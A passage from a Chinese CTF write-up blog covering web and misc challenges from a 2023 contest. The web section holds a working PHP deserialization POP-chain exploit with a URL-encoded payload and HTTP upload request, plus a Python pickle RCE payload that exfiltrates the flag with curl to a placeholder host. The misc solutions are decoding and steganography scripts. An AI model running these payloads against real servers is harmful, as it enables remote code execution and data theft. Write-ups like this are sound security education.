class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a === <span class="hljs-variable language_">$this</span>-&gt;b) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;b) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;b)) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;br/&gt;get it!!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$flag</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;goaway!!!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>从<code>CCC::__destruct</code>进入，有个判断，用<code>&amp;</code>引用地址，使<code>$a</code>永远与<code>$b</code>相等，然后echo触发<code>AAA::__toString</code>，接着可以通过return对象中不存在的属性来触发<code>BBB::__get</code>，最后绕过正则实现rce</p><p>最后结尾还有一个<code>throw new Exception</code>，破坏字符串结构即可触发fast destruct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a === <span class="hljs-variable language_">$this</span>-&gt;b) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;lewiserii&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;/???/?? /* .&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;b) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;b)) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;br/&gt;get it!!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CCC</span>();<br><span class="hljs-variable">$a</span>-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>();<br><span class="hljs-variable">$a</span>-&gt;c-&gt;s = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><code>O%3A3%3A%22CCC%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A12%3A%22%2F%3F%3F%3F%2F%3F%3F+%2F%2A+.%22%3B%7Ds%3A1%3A%22a%22%3Bs%3A9%3A%22lewiserii%22%3B%7Ds%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A6%3B</code></p><p>通过通配符匹配&#x2F;bin&#x2F;cp，将根目录所有文件复制到根目录，然后访问获得flag</p><p>或者通过<code>. /???/????????[@-[]</code>匹配php的临时文件来rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /?ctf=O%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>CCC%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>c%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>AAA%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>s%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>BBB%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A20%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>.+%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">5</span>B%<span class="hljs-number">40</span>-%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>lewiserii%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BR%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>B% HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">100.100</span>:<span class="hljs-number">10033</span><br>Content-Length: <span class="hljs-number">186</span><br>Cache-Control: max-age=<span class="hljs-number">0</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Origin: <span class="hljs-literal">null</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0xXn6nlxZVqh49pS<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">119.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------WebKitFormBoundary0xXn6nlxZVqh49pS</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">cat /f*</span><br><span class="hljs-comment">------WebKitFormBoundary0xXn6nlxZVqh49pS--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h2 id="决赛-babyWeb"><a href="#决赛-babyWeb" class="headerlink" title="决赛[babyWeb]"></a>决赛[babyWeb]</h2><p>pickle反序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GetShellWithPython</span>(<span class="hljs-title class_ inherited__">object</span>):<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">import</span> subprocess<br>       <span class="hljs-keyword">return</span> (subprocess.call,<br>              ([<span class="hljs-string">&#x27;python&#x27;</span>,<br>                 <span class="hljs-string">&#x27;-c&#x27;</span>,<br>                 <span class="hljs-string">&#x27;import os;&#x27;</span><br>                 <span class="hljs-string">&#x27;os.system(&quot;curl http://x.x.x.x:4444?a=`cat /flag`&quot;);&#x27;</span>],))<br><br>pickleData = pickle.dumps(GetShellWithPython())<br><br><span class="hljs-built_in">print</span>(base64.b64encode(pickleData))<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="初赛-number-game"><a href="#初赛-number-game" class="headerlink" title="初赛[number game]"></a>初赛[number game]</h2><p>查看index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">roll</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x38f496 = _0x359f<br>      , _0x1afb7a = <span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xda</span>)](<span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd5</span>)]() * <span class="hljs-number">0x3e8</span>);<br>    <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;getElementById&#x27;</span>](<span class="hljs-string">&#x27;number&#x27;</span>)[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xdc</span>)] = _0x1afb7a[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd3</span>)]();<br>    <span class="hljs-keyword">if</span> (_0x1afb7a == <span class="hljs-number">0x539</span>) &#123;<br>        <span class="hljs-keyword">var</span> _0x14184c = [<span class="hljs-number">0x38</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5a</span>]<br>          , _0x477866 = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> _0x6698b7 = <span class="hljs-number">0x0</span>; _0x6698b7 &lt; _0x14184c[<span class="hljs-string">&#x27;length&#x27;</span>]; _0x6698b7++)<br>            _0x477866 += <span class="hljs-title class_">String</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd9</span>)](_0x14184c[_0x6698b7] ^ _0x6698b7 + <span class="hljs-number">0x5a</span>);<br>        <span class="hljs-title function_">alert</span>(_0x477866);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x38</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x5a</span>]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    a[i]=v^i+<span class="hljs-number">0x5a</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure><h2 id="初赛-Ez-misc"><a href="#初赛-Ez-misc" class="headerlink" title="初赛[Ez_misc]"></a>初赛[Ez_misc]</h2><p>文件高位和低位交换位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.jpg&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>d=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    n=(i//<span class="hljs-number">16</span>)+((i&amp;<span class="hljs-number">0xf</span>)&lt;&lt;<span class="hljs-number">4</span>)<br>    f1.write(<span class="hljs-built_in">bytes</span>([n]))<br></code></pre></td></tr></table></figure><p>steghide空密码解密得到flag.txt</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc1-1.png"></p><p>将<code>DASH</code>替换成<code>-</code>，<code>DOT</code>替换成<code>.</code>后解摩斯</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc1-2.png"></p><h2 id="初赛-Steins-Gate"><a href="#初赛-Steins-Gate" class="headerlink" title="初赛[Steins_Gate]"></a>初赛[Steins_Gate]</h2><p>给了一张很大的图片，由<code>嘟嘟噜</code>组成一张图片，观察发现每个字是<code>16*16</code></p><p>猜测是把原图像素替换成文字了</p><p>在每个字中找一个固定的像素点，然后提取像素还原原图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Steins_Gate.png&#x27;</span>)<br>width,height=img.size<br><br>new_img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (<span class="hljs-built_in">int</span>(width / <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(height / <span class="hljs-number">16</span>)))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,height,<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,width,<span class="hljs-number">16</span>):<br>        tmp = img.getpixel((j,i))<br>        <span class="hljs-built_in">print</span>(tmp)<br>        new_img.putpixel((<span class="hljs-built_in">int</span>(j / <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(i / <span class="hljs-number">16</span>)), (tmp[<span class="hljs-number">0</span>], tmp[<span class="hljs-number">1</span>], tmp[<span class="hljs-number">2</span>]))<br><br>new_img.show()<br>new_img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc2-1.png"></p><p>使用stegsolve发现0通道有很多base64</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc2-2.png"></p><p>提取出来后发现每组后还有12个字节的冗余数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>        data=f.read()<br>        i=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>            f1.write(data[i:i+<span class="hljs-number">240</span>]+<span class="hljs-string">b&quot;\n&quot;</span>)<br>            i+=<span class="hljs-number">252</span><br></code></pre></td></tr></table></figure><p>去除冗余数据后base64解出一张图片</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc2-3.png"></p><p>同时也是多行base64的形式，尝试base64隐写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#base64解码脚本，Python2 运行</span><br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)])<br></code></pre></td></tr></table></figure><p>得到密码<code>DuDuLu~T0_Ch3@t_THe_w0r1d</code></p><p>outguess解密得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-misc2-4.png"></p><h2 id="决赛-Xcode-v5-8"><a href="#决赛-Xcode-v5-8" class="headerlink" title="决赛[Xcode v5.8]"></a>决赛[Xcode v5.8]</h2><p>xxencode-&gt;base58</p><p><img 